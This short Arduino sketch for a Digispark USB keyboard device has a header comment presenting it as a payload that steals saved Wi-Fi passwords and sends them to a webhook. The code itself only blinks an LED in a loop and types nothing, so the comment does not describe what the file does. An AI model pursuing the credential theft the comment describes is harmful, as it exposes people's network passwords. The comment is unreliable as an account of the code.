/*
  Following payload will grab saved Wifi password and will send them to your hosted webhook.
*/

#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(1000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(1000);
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(1000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(1000);
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(1000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(1000);
}
